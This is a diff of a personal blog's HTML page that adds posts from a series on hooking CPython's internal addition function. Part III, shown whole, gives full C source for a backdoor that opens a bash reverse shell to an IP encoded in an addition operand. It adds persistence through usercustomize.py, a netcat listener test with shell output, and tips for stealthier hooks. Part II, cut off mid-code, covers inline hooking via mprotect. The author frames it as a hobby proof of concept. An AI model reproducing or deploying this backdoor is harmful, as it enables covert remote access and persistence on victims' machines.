@@ -79,10 +79,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-Guilt-Free-Reflection" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/06/10/Guilt-Free-Reflection/" class="article-date">
-  <time class="dt-published" datetime="2023-06-10T11:28:18.000Z" itemprop="datePublished">2023-06-10</time>
+    <a href="/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/" class="article-date">
+  <time class="dt-published" datetime="2023-07-04T01:02:15.000Z" itemprop="datePublished">2023-07-04</time>
 </a>
     
   </div>
@@ -93,7 +93,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/06/10/Guilt-Free-Reflection/">Guilt-Free Reflection</a>
+      <a class="p-name article-title" href="/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)</a>
     </h1>
   
 
@@ -101,27 +101,72 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>To improve anything, it is vital to observe it consistently for periods of time without interference, collect data, make observations and deductions, and finally improve via trial and error. Humans have been doing this since the dawn of civilization and it is our way of understanding and navigating the natural world.</p>
-<p>When we apply this method to the self, we are bound to interfere with our own measurements. We often judge ourselves, impose expectations, and carry the weight of guilt or shame when we perceive that we fall short. This interference can cloud our observations and hinder our ability to make accurate deductions about ourselves. Consistency is impacted too. Bursts of intense self-reflection followed by periods of guilt or shame can create an unhealthy cycle. We may become hesitant to engage in self-reflection altogether, fearing the negative emotions that often accompany it.</p>
-<p>So, how do we break free from this cycle? While completely eliminating negative emotions may be unachievable due to the way our brains function, it is possible to minimize their impact by looking after yourself and taking care of your basic needs before letting your mind slip into deep introspection of your life. Things like sleep, hydration, food, walking outside, a good shower, comfortable wear and some quiet can go a long way.</p>
-<p>Next, the key here is to observe yourself objectively as an outsider, and without judgement or preconceived notions, like observing an external entity or phenomena, just observing and taking notes. For example, imagine you have a cat, and it scratches the furniture. You’d observe it’s behavior and note things like:</p>
-<ul>
-<li>“19&#x2F;09 - Cat scratches sofa when I’m outside the house”</li>
-<li>“21&#x2F;09 - Added cardboard but cat seems uninterested, still scratches sofa”</li>
-<li>“22&#x2F;09 - Moved sofa, cat seems more anxious now”</li>
+        <p>We’re back with another part of the series!</p>
+<p>In the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">previous part</a>, we’ve hooked <code>PyNumber_Add</code> function using <code>ctypes</code> and replaced it with our own implementation.<br>In this part, we will extend our extension to a backdoor that will return a reverse shell given specific addition operands.</p>
+<p>To the drawing board!</p>
+<h3 id="The-Plan"><a href="#The-Plan" class="headerlink" title="The Plan"></a>The Plan</h3><ul>
+<li>Just like in the previous part, we will hook the <code>PyNumber_Add</code> function</li>
+<li>Our code will check if one of the operands is <code>0xdeadbeef</code>.</li>
+<li>If so, it will extract the other operand and use it as an IPv4 address</li>
+<li>It will then connect to the address on port 1337 and spawn a reverse shell</li>
 </ul>
-<p>Approaching self-improvement with the same mindset of curiousity and problem-solving is not only healthier for you, but more reliable. Doing this requires the ability to observe yourself from a distance. In Buddhism, this is known as <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Nonattachment_(philosophy)">Detachment</a>. Stoicism has it’s own related concept, called <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Apatheia">Apatheia</a>.</p>
-<p>It is important to be intentful and consistent about self-reflection. You cannot seriously expect to improve if you only do it when it’s New Year’s, or when you feel down. Dedicating a consistent time and place for this activity allows observation of a wider spectrum of our different states, gaining clearer and more complete insights to act upon.</p>
+<h3 id="Adding-our-trigger"><a href="#Adding-our-trigger" class="headerlink" title="Adding our trigger"></a>Adding our trigger</h3><p>In our previous implementation, after checking that both operands are integers, we added a check to see if they are both equal to <code>2</code>.<br>We will replace this check with a check to see if one of the operands is <code>0xdeadbeef</code>, and if so, we will extract the other operand and use it as an IPv4 address.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ipNum = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PyLong_Check(a) &amp;&amp; PyLong_Check(b)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (PyLong_AsLong(a) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (PyLong_AsLong(b) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Addition implementation</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="IP-Extraction-and-Reverse-shell"><a href="#IP-Extraction-and-Reverse-shell" class="headerlink" title="IP Extraction and Reverse shell"></a>IP Extraction and Reverse shell</h3><p>Since we have access to the Python C API, we have the freedom to run any Python code we want!</p>
+<p>We will use the <code>os</code>, <code>socket</code> and <code>subprocess</code> modules to spawn a reverse shell. To avoid string formatting in C, we will use <code>strcat</code> to concatenate the strings. The IP address is extracted one byte at a time, using bit shifting and masking with <code>0xff</code> to get the lowest byte each time.</p>
+<p>The reverse shell itself is a Python one-liner that uses <code>os.dup2</code> to duplicate the socket file descriptor to the standard input, output and error, and then uses <code>subprocess.call</code> to spawn a shell.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> revShell[<span class="number">4096</span>] = <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ipNum != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Convert the IP address to a string</span></span><br><span class="line">    <span class="built_in">snprintf</span>(ip, <span class="keyword">sizeof</span>(ip), <span class="string">&quot;%d.%d.%d.%d&quot;</span>, ipNum &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to the IP address on port 1337 and spawn a shell</span></span><br><span class="line">    <span class="built_in">strcat</span>(revShell, ip);</span><br><span class="line">    <span class="built_in">strcat</span>(revShell, <span class="string">&quot;\&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);&quot;</span>);</span><br><span class="line">    PyRun_SimpleString(revShell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>And violà! We now have a backdoor that will spawn a reverse shell when the operands are <code>0xdeadbeef</code> and an IPv4 address.</p>
+<h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Python.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PyObject* <span class="title function_">my_add</span><span class="params">(PyObject* a, PyObject* b)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ipNum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> revShell[<span class="number">4096</span>] = <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Increment the reference count of a and b</span></span><br><span class="line">    Py_INCREF(a);</span><br><span class="line">    Py_INCREF(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that a and b are both PyLongs</span></span><br><span class="line">    <span class="keyword">if</span> (!PyLong_Check(a) || !PyLong_Check(b)) &#123;</span><br><span class="line">        Py_DECREF(a);</span><br><span class="line">        Py_DECREF(b);</span><br><span class="line">        <span class="keyword">return</span> Py_None;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PyNumber_Subtract(a, b) is equivalent to a - b,</span></span><br><span class="line">    <span class="comment">// So we can calculate a + b by doing a - (-b).</span></span><br><span class="line">    <span class="comment">// We can get -b by multiplying b by -1.</span></span><br><span class="line">    PyObject *minus_b = PyNumber_Multiply(b, PyLong_FromLong(<span class="number">-1</span>));</span><br><span class="line">    PyObject *result = PyNumber_Subtract(a, (PyObject*) minus_b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (PyLong_AsLong(a) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(b);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (PyLong_AsLong(b) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(a);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ipNum != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(ip, <span class="keyword">sizeof</span>(ip), <span class="string">&quot;%lu.%lu.%lu.%lu&quot;</span>, (ipNum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (ipNum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (ipNum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, ipNum &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(revShell, ip);</span><br><span class="line">        <span class="built_in">strcat</span>(revShell, <span class="string">&quot;&#x27;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PyRun_SimpleString(revShell);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Py_DECREF(a);</span><br><span class="line">    Py_DECREF(b);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><p>Python looks for a startup script in the <code>site-packages/usercustomize.py</code> file, so we can drop our script from the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">previous part</a> there and it will be loaded automatically. Don’t forget to edit the Python script and change the path to <code>my_add.so</code> to the correct path on your machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compile our backdoor module</span></span><br><span class="line">gcc -shared -o my_add.so -fPIC my_add.c $(python3-config --includes --ldflags)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find the user site-packages directory</span></span><br><span class="line">python -c <span class="string">&quot;import site; print(site.USER_SITE)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit the script and change the path to `my_add.so` to the full path of `site-packages/my_add.so` on your machine</span></span><br><span class="line">vim snek.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy the our script to `site-packages/sitecustomize.py`</span></span><br><span class="line"><span class="built_in">cp</span> snek.py /home/user/.local/lib/python3.8/site-packages/usercustomize.py</span><br></pre></td></tr></table></figure>
+
+<p>Now, let’s test our backdoor!</p>
+<h3 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h3><p>We’ll listen on port 1337 using <code>nc</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc -vvlp 1337</span><br><span class="line">Listening on astral 1337</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s perform a simple calculation and see what happens.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python3</span><br><span class="line">Address of my_add: 0x7face7051276</span><br><span class="line">Address of PyNumber_Add: 0x50f750</span><br><span class="line">mprotect(addr=0x50f000, size=0x1000, perms=0x7) ret=0 errno=0</span><br><span class="line">Address of shellcode trampoline: 0x7face6f90390</span><br><span class="line">memmove: 0x50f750</span><br><span class="line">1 + 1 = 2</span><br><span class="line">2 + 2 = 4</span><br><span class="line">Python 3.8.10 (default, May 26 2023, 14:05:08)</span><br><span class="line">[GCC 9.4.0] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; 1 + 1</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>So far so good, but does our backdoor work? <code>0x7f000001</code> is hex for <code>127.0.0.1</code>, so let’s try that!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0xdeadbeef + 0x7f000001</span><br></pre></td></tr></table></figure>
+
+<p>And we get a shell! Beautiful!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Connection received on localhost 34998</span><br><span class="line">user@astral:~$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)</span><br><span class="line">user@astral:~$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="Notes-and-Caveats"><a href="#Notes-and-Caveats" class="headerlink" title="Notes and Caveats"></a>Notes and Caveats</h3><p>This is a proof of concept, and is not meant to be used in production (whatever “production” means for a backdoor, lol).</p>
+<p>Here are some of the things that could go wrong with this implementation:</p>
+<ul>
+<li>I’m pretty sure the current implementation breaks a lot of things, such as the <code>+</code> operator for other types, but I haven’t tested it extensively</li>
+<li>Thread safety is not guaranteed</li>
+<li>The <code>mprotect</code> call won’t work on platforms with <code>W^X</code> memory protection</li>
+<li><code>mprotect</code> won’t work on Windows</li>
+<li>The shellcode trampoline won’t work on platforms other than x86_64</li>
+<li>The inline hook is implemented in a very naive way, and overwrites the original function code of <code>PyNumber_Add</code>. A better way to implement the inline hook would be to use a trampoline, and jump to the original function code after we’re done. This requires us to allocate a page of executable memory, and copy the original function code there, and then jump to it</li>
+<li>Alternatively, we can use a hooking library such as <a target="_blank" rel="noopener" href="https://github.com/Zeex/subhook">subhook</a></li>
+<li>The reverse shell doesn’t fork a child process, so the Python process will get stuck until the reverse shell exits, and <code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code> won’t get redirected back to the user</li>
+</ul>
+<p>Improvements and features that can be added:</p>
+<ul>
+<li>We can use <code>mmap()</code> to get a page of executable memory and load shellcode from memory, instead of using <code>CDLL</code> to load a shared library from disk</li>
+<li>The backdoor components and it’s communication are not encrypted or obfuscated in any way</li>
+<li>A Python shell would be nice, instead of relying on <code>/bin/bash</code></li>
+<li>As an attacker, there are better hook targets than <code>PyNumber_Add</code>, such as <code>socket.recv()</code>, which is guaranteed to be called with user input in a lot of places</li>
+<li>Another option is string formatting functions, which are also used everywhere and likely to be called with user input (thanks to <a target="_blank" rel="noopener" href="https://twitter.com/HarpazDor">@HarpazDor</a> for the suggestion!)</li>
+</ul>
+<p>This was a really fun way to spend a weekend!<br>I hope you enjoyed reading this series as much as I enjoyed writing it, and maybe even learned something new along the way.</p>
+<p>Ciao for now!</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/06/10/Guilt-Free-Reflection/" data-id="clipuwbnb0005bjoibzkfew4m" data-title="Guilt-Free Reflection" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/" data-id="cljnja7p3000kduos3v586z55" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li></ul>
-
     </footer>
   </div>
   
@@ -132,8 +177,8 @@
   
     <article id="post-An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/06/10/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/" class="article-date">
-  <time class="dt-published" datetime="2023-06-10T10:31:09.416Z" itemprop="datePublished">2023-06-10</time>
+    <a href="/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/" class="article-date">
+  <time class="dt-published" datetime="2023-07-04T00:10:10.693Z" itemprop="datePublished">2023-07-04</time>
 </a>
     
   </div>
@@ -144,7 +189,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/06/10/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/">An Exercise in Self Love: What Would You Wish for Yourself?</a>
+      <a class="p-name article-title" href="/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/">An Exercise in Self Love: What Would You Wish for Yourself?</a>
     </h1>
   
 
@@ -252,7 +297,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/06/10/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/" data-id="clipuwbn40001bjoi16zh1k73" data-title="An Exercise in Self Love: What Would You Wish for Yourself?" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/" data-id="cljnja7oe0001duosepzibunr" data-title="An Exercise in Self Love: What Would You Wish for Yourself?" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -268,8 +313,8 @@
   
     <article id="post-NixOS-is-so-Cool" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/06/10/NixOS-is-so-Cool/" class="article-date">
-  <time class="dt-published" datetime="2023-06-10T10:31:09.416Z" itemprop="datePublished">2023-06-10</time>
+    <a href="/2023/07/04/NixOS-is-so-Cool/" class="article-date">
+  <time class="dt-published" datetime="2023-07-04T00:10:10.693Z" itemprop="datePublished">2023-07-04</time>
 </a>
     
   </div>
@@ -280,7 +325,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/06/10/NixOS-is-so-Cool/">NixOS is so Cool!</a>
+      <a class="p-name article-title" href="/2023/07/04/NixOS-is-so-Cool/">NixOS is so Cool!</a>
     </h1>
   
 
@@ -325,11 +370,256 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/06/10/NixOS-is-so-Cool/" data-id="clipuwbne0009bjoi0i2k2igk" data-title="NixOS is so Cool!" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/07/04/NixOS-is-so-Cool/" data-id="cljnja7os0009duos1yii7anr" data-title="NixOS is so Cool!" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tech/" rel="tag">tech</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/" class="article-date">
+  <time class="dt-published" datetime="2023-07-03T21:34:31.000Z" itemprop="datePublished">2023-07-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part II)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Greetings, fellow hackers and tinkerers, and welcome to the second installation of the “Sneaky Snek” blog post series! This series is dedicated to having fun messing around with CPython’s core functionality and modifying arithmetic operator implementation in runtime. In the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I/">Previous Part</a>, we’ve started diving into CPython’s implementation of the <code>+</code> operator, <code>PyNumber_Add</code>, intercepted number addition operations using <code>gdb</code> breakpoint commands, inspected the <code>PyObject</code> arguments and modified the result in an automated fashion.</p>
+<p>In this part, we will explore inline hooking of the function from within a Python script using <code>ctypes</code>.</p>
+<h3 id="Initial-Recon"><a href="#Initial-Recon" class="headerlink" title="Initial Recon"></a>Initial Recon</h3><p>First, we will recall the function definition:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PyAPI_FUNC(PyObject *) PyNumber_Add(PyObject *o1, PyObject *o2);</span><br></pre></td></tr></table></figure>
+
+<p>Let’s examine <code>PyNumber_Add</code> and see where it’s code resides in memory.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/10i PyNumber_Add</span><br><span class="line">   0x632512 &lt;PyNumber_Add&gt;:     endbr64</span><br><span class="line">   0x632516 &lt;PyNumber_Add+4&gt;:   push   %r12</span><br><span class="line">   0x632518 &lt;PyNumber_Add+6&gt;:   push   %rbp</span><br><span class="line">   0x632519 &lt;PyNumber_Add+7&gt;:   push   %rbx</span><br><span class="line">   0x63251a &lt;PyNumber_Add+8&gt;:   mov    %rdi,%rbx</span><br><span class="line">   0x63251d &lt;PyNumber_Add+11&gt;:  mov    %rsi,%rbp</span><br><span class="line">   0x632520 &lt;PyNumber_Add+14&gt;:  mov    $0x0,%edx</span><br><span class="line">   0x632525 &lt;PyNumber_Add+19&gt;:  call   0x630fec &lt;binary_op1&gt;</span><br><span class="line">   0x63252a &lt;PyNumber_Add+24&gt;:  cmp    $0x8f5ef0,%rax</span><br><span class="line">   0x632530 &lt;PyNumber_Add+30&gt;:  je     0x632537 &lt;PyNumber_Add+37&gt;</span><br><span class="line">(gdb) info proc map</span><br><span class="line">      Start Addr           End Addr       Size     Offset  Perms  objfile</span><br><span class="line">        0x400000           0x423000    0x23000        0x0  r--p   /usr/bin/python3.8d</span><br><span class="line">        0x423000           0x691000   0x26e000    0x23000  r-xp   /usr/bin/python3.8d</span><br><span class="line">        0x691000           0x8e7000   0x256000   0x291000  r--p   /usr/bin/python3.8d</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>Great, we have at least 30 bytes of code. That’s more than enough to insert a <code>jmp</code>! There is a problem, though - our code is mapped to a segment with <code>r-xp</code> permissions, so we are <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=otCpCn0l4Wo">missing</a> the “write” permission. This is common for code segments in programs, as there is usually no need to have write permissions for code segments (unless <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Just-in-time_compilation">JIT</a> is being used). We will deal with this later.</p>
+<h3 id="The-Plan"><a href="#The-Plan" class="headerlink" title="The Plan"></a>The Plan</h3><p>Our objective is to trick Python into believing that “2 + 2 &#x3D; 5”.<br>For this purpose, we will redirect execution to a custom function that will check the operands and modify the result if necessary.</p>
+<p>We want a Python script that will:</p>
+<ul>
+<li>Create a custom version of the function</li>
+<li>Load it into Python’s memory</li>
+<li>Locate the <code>PyNumber_Add</code>‘s memory address</li>
+<li>Change it’s page permissions to writable</li>
+<li>Patch the first bytes of <code>PyNumber_Add</code> with a jump to our function</li>
+<li>Run some tests</li>
+</ul>
+<p>Let’s break these down, one by one.</p>
+<h3 id="Creating-my-add"><a href="#Creating-my-add" class="headerlink" title="Creating my_add"></a>Creating <code>my_add</code></h3><p>While there are advanced ways of inserting code into the memory space of a running process, we will keep things simple and go with loading a shared object (<code>.so</code>). Python has it’s own <a target="_blank" rel="noopener" href="https://docs.python.org/3/c-api/">C API</a> that allows us to extend Python, deal with <code>PyObject</code>s and even run Python from C. This will come in handy!</p>
+<p><strong>Note</strong>: You may need to install <code>python3-dev</code> for the CPython headers.</p>
+<p>Since we are planning to practically destroy <code>PyNumber_Add</code>, we will need a different way to calculate the result. There are safer ways to implement a generic and reusable hook, but for our purposes and in the spirit of having fun, I’ve decided on a quirky approach: <code>a + b</code> is mathematically equivalent to <code>a - (-b)</code>! We will use this to our advantage and implement <code>my_add</code> as follows:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Python.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PyObject* <span class="title function_">my_add</span><span class="params">(PyObject* a, PyObject* b)</span> &#123;</span><br><span class="line">    <span class="comment">// Increase reference count to prevent garbage collection</span></span><br><span class="line">    Py_INCREF(a);</span><br><span class="line">    Py_INCREF(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if both arguments are ints</span></span><br><span class="line">    <span 